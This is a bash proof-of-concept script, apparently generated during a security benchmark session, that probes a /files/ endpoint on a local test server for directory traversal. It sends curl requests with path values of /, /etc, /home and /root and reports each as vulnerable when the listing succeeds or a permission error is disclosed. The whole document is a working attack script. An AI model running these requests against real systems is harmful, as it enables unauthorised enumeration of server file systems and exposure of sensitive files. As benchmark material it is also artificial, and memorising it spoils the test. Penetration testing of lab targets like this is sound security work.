#!/bin/bash
# POC: Test directory traversal vulnerability on the /files/ endpoint to enumerate filesystem
# Target: ./repo
# Created: 2025-11-07T22:03:48.095Z
# Session: benchmark-XBEN-083-24-mhpe40z0

# Directory Traversal and Local File System Enumeration POC
# Tests the /files/ endpoint for unauthenticated directory listing

TARGET="http://localhost:2280"
ENDPOINT="/files/"

echo "[*] Directory Traversal POC for /files/ endpoint"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Root directory listing
echo "[+] Test 1: Attempting to list root directory (/)"
echo "    URL: $TARGET$ENDPOINT?path=/"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?path=/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "    HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "    Response: $BODY" | head -c 500
    echo ""
    echo "    [✓] VULNERABLE: Root directory listing successful"
else
    echo "    Response: $BODY" | head -c 200
    echo ""
    echo "    [✗] Not vulnerable or endpoint not accessible"
fi
echo ""

# Test 2: /etc directory
echo "[+] Test 2: Attempting to list /etc directory"
echo "    URL: $TARGET$ENDPOINT?path=/etc"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?path=/etc")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "    HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "    Response: $BODY" | head -c 500
    echo ""
    echo "    [✓] VULNERABLE: /etc directory listing successful"
else
    echo "    Response: $BODY" | head -c 200
    echo ""
    echo "    [✗] No access to /etc"
fi
echo ""

# Test 3: /home directory
echo "[+] Test 3: Attempting to list /home directory"
echo "    URL: $TARGET$ENDPOINT?path=/home"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?path=/home")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "    HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "    Response: $BODY" | head -c 500
    echo ""
    echo "    [✓] VULNERABLE: /home directory listing successful"
else
    echo "    Response: $BODY" | head -c 200
    echo ""
fi
echo ""

# Test 4: Permission denied test (/root)
echo "[+] Test 4: Attempting to list /root (permission denied test)"
echo "    URL: $TARGET$ENDPOINT?path=/root"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?path=/root")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "    HTTP Status: $HTTP_CODE"
echo "    Response: $BODY" | head -c 300
echo ""
if [ "$HTTP_CODE" = "403" ]; then
    echo "    [✓] VULNERABLE: Path exists and permission error disclosed"
else
    echo "    [!] Status code: $HTTP_CODE"
fi